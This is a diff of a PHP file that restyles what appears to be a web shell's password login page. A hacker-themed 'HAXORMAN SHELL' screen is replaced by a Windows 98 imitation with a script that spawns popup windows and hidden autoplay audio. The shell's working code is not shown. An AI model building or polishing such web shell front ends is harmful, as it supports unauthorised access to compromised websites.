@@ -101,92 +101,169 @@ if (is_logged_in()) {
     }
     ?>
 
-  <!DOCTYPE html>
-    <html>
-    <head>
-        <title> SHELL ACCESS</title>
-        <style>
-            * { margin:0; padding:0; box-sizing:border-box; }
-            body {
-                background: #0a0a0a;
-                font-family: "Courier New", monospace;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                height: 100vh;
-                color: #00ff00;
-            }
-            .login-box {
-                background: #111;
-                padding: 40px;
-                border-radius: 10px;
-                border: 2px solid #ff0000;
-                width: 350px;
-                text-align: center;
-                box-shadow: 0 0 20px #ff0000;
-            }
-            h1 {
-                margin-bottom: 30px;
-                color: #ff0000;
-                text-shadow: 0 0 10px #ff0000;
-            }
-            input[type="password"] {
-                width: 100%;
-                padding: 12px;
-                margin: 15px 0;
-                background: #000;
-                border: 1px solid #ff0000;
-                color: #00ff00;
-                border-radius: 5px;
-                font-size: 16px;
-            }
-            input[type="submit"] {
-                width: 100%;
-                padding: 12px;
-                background: #ff0000;
-                color: white;
-                border: none;
-                border-radius: 5px;
-                font-size: 16px;
-                font-weight: bold;
-                cursor: pointer;
-                transition: 0.3s;
-            }
-            input[type="submit"]:hover {
-                background: #cc0000;
-            }
-            .error {
-                color: #ff0000;
-                margin: 10px 0;
-                text-shadow: 0 0 5px #ff0000;
-            }
-            .footer {
-                margin-top: 20px;
-                color: #666;
-                font-size: 12px;
-            }
-            .warning {
-                color: #ffff00;
-                font-size: 10px;
-                margin-top: 10px;
-            }
-        </style>
-    </head>
-    <body>
-        <div class="login-box">
-            <h1>💀 HAXORMAN SHELL</h1>
-           
-            <form method="post">
-                <input type="password" name="pass" placeholder="Enter password" required autofocus>
-                <input type="submit" value="ENTER HELL">
-            </form>
-            <div class="warning">⚠️ Self-healing system active</div>
-            <div class="footer">
-                
-            </div>
+                  <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title> Aptisme</title>
+    <link rel="icon" type="image/x-icon" href="https://www.exoticheritagecats.com/bengal-kingshttps://win98icons.alexmeub.com/icons/ico/msie1-2.ico">
+    <style>
+        body {
+            background-color: #008080; 
+            font-family: Tahoma, Verdana, sans-serif;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .desktop-icon {
+            position: absolute;
+            width: 80px;
+            text-align: center;
+            font-size: 11px;
+            color: white;
+        }
+        .desktop-icon img {
+            width: 32px;
+            image-rendering: pixelated;
+        }
+        .login-box {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(192,192,192,0.9);
+            border: 2px solid #000;
+            width: 340px;
+            box-shadow: inset -2px -2px 0 #808080, inset 2px 2px 0 #ffffff;
+            z-index: 1000;
+        }
+        .login-titlebar {
+            background: linear-gradient(#000080, #000060);
+            color: #fff;
+            padding: 8px;
+            font-weight: bold;
+            font-size: 13px;
+            border-bottom: 1px solid #808080;
+            box-shadow: inset 0 -1px 0 #ffffff;
+        }
+        .login-titlebar img {
+            width: 16px;
+            vertical-align: middle;
+            margin-right: 6px;
+        }
+        .login-body {
+            padding: 20px;
+            background: #d4d0c8;
+        }
+        .login-body label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 11px;
+            color: #000;
+        }
+        .login-body input[type=password] {
+            width: 100%;
+            padding: 7px;
+            margin-bottom: 15px;
+            border: 2px solid #000;
+            font-size: 12px;
+            background-color: #fff;
+            color: #000;
+            box-shadow: inset -1px -1px 0 #808080, inset 1px 1px 0 #ffffff;
+        }
+        .login-body input[type=submit] {
+            width: 100%;
+            background-color: #c0c0c0;
+            color: #000;
+            border: 2px solid #000;
+            padding: 7px;
+            font-weight: bold;
+            font-size: 12px;
+            cursor: pointer;
+            box-shadow: inset -1px -1px 0 #808080, inset 1px 1px 0 #ffffff;
+        }
+        .login-body input[type=submit]:hover {
+            background-color: #a0a0a0;
+        }
+        .feeling-window {
+            position: absolute;
+            width: 160px;
+            background: #c0c0c0;
+            border: 2px solid #000;
+            box-shadow: inset -2px -2px 0 #808080, inset 2px 2px 0 #ffffff;
+            z-index: 999;
+            font-size: 11px;
+        }
+        .feeling-titlebar {
+            background: linear-gradient(#000080, #000060);
+            color: #fff;
+            padding: 4px;
+            font-weight: bold;
+            font-size: 11px;
+        }
+        .feeling-body {
+            padding: 10px;
+            background: #d4d0c8;
+            color: #000;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="desktop-icon" style="top: 20px; left: 20px;">
+        <img src="https://art.pixilart.com/242f7cb73b49934.png">
+        <div>My Documents</div>
+    </div>
+    <div class="desktop-icon" style="top: 100px; left: 20px;">
+        <img src="https://win98icons.alexmeub.com/icons/png/computer_explorer-2.png">
+        <div>My Computer</div>
+    </div>
+    <div class="desktop-icon" style="top: 180px; left: 20px;">
+        <img src="https://win98icons.alexmeub.com/icons/png/recycle_bin_empty-4.png">
+        <div>Recycle Bin</div>
+    </div>
+    <div class="desktop-icon" style="top: 260px; left: 20px;">
+        <img src="https://win98icons.alexmeub.com/icons/png/msie1-2.png">
+        <div>Internet Explorer</div>
+    </div>
+    <div class="desktop-icon" style="top: 340px; left: 20px;">
+        <img src="https://win98icons.alexmeub.com/icons/png/network_cool_two_pcs-4.png">
+        <div>Network</div>
+    </div>
+
+    <div class="login-box">
+        <div class="login-titlebar">
+            <img src="https://win98icons.alexmeub.com/icons/png/msie1-2.png">
+            [ Login Dulu Deck ]
         </div>
-    </body>
-    </html>  
+        <div class="login-body">
+            <form method="post">
+                <label>Password:</label>
+                <input type="password" name="password" required autofocus>
+                <input type="submit" value="Login">
+            </form>
+        </div>
+    </div>
+
+    <script>
+    function spawnFeelingWindow() {
+        const w = document.createElement('div');
+        w.className = 'feeling-window';
+        w.style.top = Math.random() * (window.innerHeight - 100) + 'px';
+        w.style.left = Math.random() * (window.innerWidth - 160) + 'px';
+        w.innerHTML = '<div class="feeling-titlebar">Feeling</div><div class="feeling-body">Are you OK?</div>';
+        document.body.appendChild(w);
+        setTimeout(() => { w.remove(); }, 5000);
+    }
+    setInterval(spawnFeelingWindow, 1000);
+    </script>
+
+    <audio autoplay hidden>
+        <source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg">
+    </audio>
+
+</body>
+</html>
   <?php
 }
     ?>
